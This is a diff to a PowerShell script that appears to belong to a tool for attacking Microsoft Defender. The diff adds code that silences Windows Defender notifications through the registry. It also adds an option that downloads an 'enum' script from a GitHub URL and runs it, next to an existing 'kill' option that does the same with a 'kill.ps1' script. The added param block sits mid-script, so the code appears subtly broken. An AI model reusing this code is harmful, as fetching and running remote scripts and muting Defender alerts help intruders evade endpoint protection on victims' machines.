@@ -324,6 +324,11 @@ if (-not $Action) {
 }
 
 
+param (
+    [string]$Action,
+    [string]$Path = "C:\Windows",  # Default path for --enum
+    [int]$Depth = 1  # Default depth if not provided for --enum
+)
 
 # Function to execute external scripts in /additional repo
 function Run-ScriptFromURL {
@@ -339,14 +344,33 @@ function Run-ScriptFromURL {
     }
 }
 
+# Function to disable or enable Windows Defender popups in --enum
+function Toggle-DefenderPopup {
+    param (
+        [switch]$Disable
+    )
+    $keyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter"
+    if ($Disable) {
+        Write-Host "Disabling Windows Defender popups..."
+        Reg.exe add $keyPath /v "Enabled" /t REG_DWORD /d "0" /f
+    } else {
+        Write-Host "Enabling Windows Defender popups..."
+        Reg.exe delete $keyPath /v "Enabled" /f
+    }
+}
+
 # Handle the different options
 switch ($Action) {
     '--kill' {
-	Write-Host ""
         Write-Host "Executing kill script..."
         Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/kill.ps1"
     }
+    '--enum' {
+        Write-Host "Executing enumeration script..."
+        Write-Host "Enumerating directory: $Path with depth $Depth"
+        Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/enum.ps1"
+    }
     default {
-        Write-Host "Invalid argument. Use --kill for example."
+        Write-Host "Invalid argument. Use --kill or --enum <path> [depth]."
     }
 }
